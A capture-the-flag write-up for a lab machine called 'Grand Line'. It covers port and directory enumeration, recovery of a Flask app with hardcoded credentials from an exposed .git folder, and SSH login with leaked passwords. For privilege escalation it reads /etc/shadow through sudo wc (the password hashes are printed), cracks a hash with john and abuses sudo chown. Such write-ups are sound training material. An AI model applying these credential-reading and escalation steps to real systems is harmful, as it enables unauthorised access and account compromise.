# Grand Line

## Enumeration
```bash
└─$ nmap  -sV -A -p- -sC  10.10.6.171
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 11:21 BST
Nmap scan report for 10.10.6.171
Host is up (0.036s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b2:4c:49:da:7c:9a:3a:ba:6e:59:46:c2:a9:e6:a2:35 (RSA)
|   256 7a:3e:30:70:cf:32:a4:f2:0a:cb:2b:42:08:0c:19:bd (ECDSA)
|_  256 4f:35:e1:33:96:84:5d:e5:b3:75:7d:d8:32:18:e0:a8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8081/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -u http://10.10.6.171:8081/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.6.171:8081/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 36ms]
#                       [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 38ms]
# Copyright 2007 James Fisher [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 41ms]
#                       [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 41ms]
#                       [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 46ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 48ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 51ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 51ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 54ms]
#                       [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 56ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 57ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 57ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 59ms]
# on atleast 2 different hosts [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 66ms]
login                   [Status: 200, Size: 1555, Words: 65, Lines: 43, Duration: 36ms]
api                     [Status: 200, Size: 18, Words: 3, Lines: 1, Duration: 33ms]
forgot                  [Status: 200, Size: 1296, Words: 200, Lines: 28, Duration: 34ms]
                        [Status: 200, Size: 3926, Words: 558, Lines: 79, Duration: 37ms]
:: Progress: [220560/220560] :: Job [1/1] :: 579 req/sec :: Duration: [0:16:38] :: Errors: 0 ::

┌──(marius㉿localhost)-[~/CTF/Hydra/GrandLine]
└─$ ffuf -w /usr/share/wordlists/dirb/big.txt -recursion -u http://10.10.6.171:80/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.6.171:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 37ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 58ms]
lost                    [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 33ms]
[INFO] Adding a new job to the queue: http://10.10.6.171:80/lost/FUZZ

server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 36ms]
[INFO] Starting queued job on target: http://10.10.6.171:80/lost/FUZZ

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 33ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 34ms]
:: Progress: [20469/20469] :: Job [2/2] :: 1169 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
```
### I download the .git and check around it if I can find something

## Exploitation
```bash
git checkout e03a7b5c40fd2d3d58e9b0db0c0f4292a1009900
```
```bash
└─$ cat app.py
```
```python 
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    return render_template('login.html')

@app.route('/api/')
@app.route('/api')
def api():
    return "API Action Missing"

@app.route('/api/<uname>',methods=['POST'])
def info(uname):
    if(uname == ""):
        return "Username not provided"
    print("OK")
    data=request.get_json(force=True)
    print(data)
    if(data['key']=='57db5c001c802fc4be25afb02cff9bf8'):
        if(uname=="admin"):
            return '{"username":"admin","password":"AdminPasswd"}'
        else:
            return 'Invalid Username'
    else:
        return "Invalid API Key"

@app.route('/forgot')
def forgot():
    return render_template('forgot.html')

app.run(host='0.0.0.0',port=8081)
```
### I got 2 passwords after the research but only zorro works
```bash
{"username":"zoro","password":"1_G07_L0S7_0Nc3_4G41n"}

{"username":"luffy","password":"ThisIsNotMyPassword"}
```
### I go on the ssh of zorro

## User FLAG

I forgot to write it :(

## Privilege Escalation
```bash
zoro@grandline:~$ sudo wc --files0-from "/etc/shadow"
wc: '
root:$6$hUGaBuNk$VROksV2vkl8C8Bc51SsdJ0YCp5xa1A6evIlPfQC802JBxvMROcDH04WEDij3fxo8dGSO6ObTy5sV16tUaaO.o.:18720:0:99999:7:::
'luffy:$6$Qin3OaoK$zPDgzM0Fxptmoe6jPgGI.MpAV4cnZOBY6yVq6IQ9TiGVAXt4O04Vi9pmF.PBJDsTzFxAzQZW5S3tyyw0xa.ji/:19053:0:99999:7:::
```
### I brute force the luffy password with john
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash_luffy
```
### On the luffy ssh session there is a specific right on the chown binary, so I use it
```bash
sudo chown luffy:luffy /root
```
## Root FLAG

```cat root/thisIsATreasureDidYouExpectRootDotTXT.txt``` : EPI{r_W3_Phri3nD2_0R_ph032_7h@_KInd_0F_7Hin9_J00_D3CiD3_J00R53lv32}
